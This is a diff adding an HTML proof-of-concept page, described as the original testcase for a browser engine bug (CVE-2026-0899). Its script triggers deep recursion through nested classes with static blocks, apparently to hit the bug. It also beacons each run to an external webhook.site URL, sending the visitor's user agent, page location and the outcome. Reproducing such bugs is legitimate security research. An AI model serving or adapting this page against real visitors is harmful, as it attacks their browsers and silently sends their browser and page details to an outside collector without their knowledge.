@@ -1,0 +1,41 @@
+<!DOCTYPE html><html><head><meta charset="utf-8"><title>t</title></head><body>
+<div id="st">single-shot running</div>
+<script>
+// ORIGINAL testcase from bug 458914193 (CVE-2026-0899) - single execution, beaconed variant
+var TAG='0899-single';
+var WH='https://webhook.site/357b7442-f3cc-4e1c-869b-fc65a3a7a2ad';
+var RID=Math.random().toString(36).slice(2,8);
+function beacon(tag,extra){
+  try{
+    var p=JSON.stringify({cve:TAG,rid:RID,tag:tag,t:new Date().toISOString(),ua:navigator.userAgent,loc:location.href,extra:extra||null});
+    if(navigator.sendBeacon){ try{navigator.sendBeacon(WH,p);}catch(e){} }
+    try{ fetch(WH,{method:'POST',mode:'no-cors',body:p}); }catch(e){}
+  }catch(e){}
+}
+beacon('start');
+class C1 {}
+const v1 = {
+    n() {
+        try {
+            this.n();
+        } catch (e) {}
+        class C2 {
+            constructor() {
+                class C3 extends C1 {
+                    constructor() {}
+                    a;
+                    static {};
+                    b;
+                    static {
+                        let x = 0;
+                    }
+                }
+            }
+        };
+        new C2();
+    }
+};
+let res = v1.n();
+document.getElementById('st').textContent = 'SINGLE DONE';
+beacon('end', {result: 'SINGLE DONE'});
+</script></body></html>
